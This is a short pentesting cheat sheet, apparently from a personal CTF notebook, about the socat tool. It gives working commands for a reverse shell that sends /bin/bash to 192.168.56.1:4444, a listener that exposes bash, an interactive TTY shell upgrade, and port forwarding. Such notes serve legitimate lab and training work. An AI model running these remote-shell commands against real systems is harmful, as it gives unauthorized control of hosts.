#### Official Documentation: [https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)
#### Cheat Sheet: [[Kali Tools#Socat|Socat Commands]]
## Purpose
Socat is like Netcat but more advanced, supporting many protocols, encryption, IPv6, and multiple I/O streams. It’s used for shell upgrades and complex forwarding.

## Scenarios
- CTF: Upgrade a basic reverse shell into a fully interactive TTY.  
- Real world: Forward ports securely, bridge connections, or create encrypted tunnels.

## All needed info to run
- Syntax: `socat <address1> <address2>`.  
- Common uses:
  - Reverse shell: `socat tcp-connect:<ip>:<port> exec:/bin/bash,pty,stderr,sigint,setsid,sane`  
  - Listener: `socat tcp-listen:<port>,reuseaddr,fork exec:/bin/bash,pty,stderr,sigint,setsid,sane`  
  - File transfer or port forwarding: `socat tcp-listen:<port> tcp:<target>:<port>`  
- Options:
  - `pty,stderr,sigint,setsid,sane` → makes shells stable with TTY support.  
  - `fork` → allow multiple connections.  
  - `ssl:` → enable TLS.

## Example commands & outputs
```bash
# Reverse shell (victim to attacker)
Victim: socat tcp-connect:192.168.56.1:4444 exec:/bin/bash,pty,stderr,sigint,setsid,sane
Attacker: socat tcp-listen:4444,reuseaddr,fork -

# Fully interactive shell upgrade
Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.1:4444
# Result: fully interactive bash with arrow keys and tab completion

# Port forward
$ socat tcp-listen:8080,reuseaddr,fork tcp:192.168.56.101:80
```

!!! note "Socat Basics"
	- Use `pty,stderr,sigint,setsid,sane` for stable shells.
	- Great for upgrading raw shells into full TTYs.
	- Supports many protocols beyond TCP (UDP, SSL, SOCKS).
	- Can replace Netcat when `-e` is disabled or when advanced features are needed.


### [[Kali Tools#Socat|Socat Commands]]